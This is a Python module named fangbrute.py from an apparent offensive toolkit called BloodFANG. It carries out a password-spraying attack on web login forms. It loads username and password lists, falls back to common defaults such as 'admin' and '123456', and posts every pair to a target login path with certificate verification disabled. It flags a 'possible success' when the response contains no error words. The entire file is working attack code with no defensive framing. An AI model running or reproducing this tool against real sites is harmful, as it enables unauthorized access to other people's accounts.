# BloodFANG/core/fangbrute.py
import requests, time
from pathlib import Path

PAYLOAD_DIR = Path(__file__).resolve().parent / "payloads"
def _load_payloads(name, fallback):
    f = PAYLOAD_DIR / name
    try:
        if f.exists():
            lines=[l.strip() for l in f.read_text(encoding="utf-8").splitlines()
                   if l.strip() and not l.startswith("#")]
            if lines: return lines
    except Exception: pass
    return fallback

USERS = _load_payloads("brute_usernames.txt", ["admin","user","test"])
PASS  = _load_payloads("brute_passwords.txt", ["password","123456","admin123"])

def password_spray(base, users, pwds, path, emit, stop_event=None):
    if not path.startswith("/"): path="/"+path
    target = base.rstrip("/") + path
    emit(f"[BRUTE] Target: {target}")
    for u in users:
        for p in pwds:
            if stop_event and stop_event.is_set(): emit("[BRUTE] Stopped."); return
            data={"username":u,"password":p}
            try:
                r=requests.post(target,data=data,timeout=8,verify=False,allow_redirects=True)
                emit(f"[BRUTE] {r.status_code} {u}:{p}")
                low=r.text.lower()
                if all(k not in low for k in ("invalid","incorrect","error")):
                    emit(f"[BRUTE] Possible success {u}:{p}")
            except Exception as e: emit(f"[BRUTE] Error: {e}")
            time.sleep(0.3)
    emit("[BRUTE] Completed.")

def run(target,emit,stop_event=None):
    b,p=(target.split('::',1)+[''])[:2]; password_spray(b,USERS,PASS,p,emit,stop_event)
